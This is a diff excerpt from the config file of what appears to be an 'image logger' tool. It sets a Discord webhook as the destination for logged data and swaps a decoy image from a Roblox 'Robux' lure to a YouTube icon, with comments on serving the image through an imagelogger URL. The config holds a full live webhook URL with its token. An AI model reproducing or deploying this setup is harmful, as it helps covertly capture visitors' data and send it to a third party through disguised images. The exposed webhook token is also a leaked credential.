@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1444381628754563123/2ZzVsNqMiJ5KWWjmAgXjcAwTu_FL9Lm_FsvmWoEHzLD80JLtBpshpZJoJ0zSYDRzZ3Vu",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fapps.apple.com%2Fgb%2Fapp%2Frobux-points-for-roblox%2Fid6743953916&psig=AOvVaw1N4SmglLpRUPCcNMQ7S3X-&ust=1764524334799000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCKi50MTzl5EDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://img.freepik.com/vecteurs-premium/icones-youtube-couleurs_1209566-1.jpg?semt=ais_hybrid&w=740&q=80", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
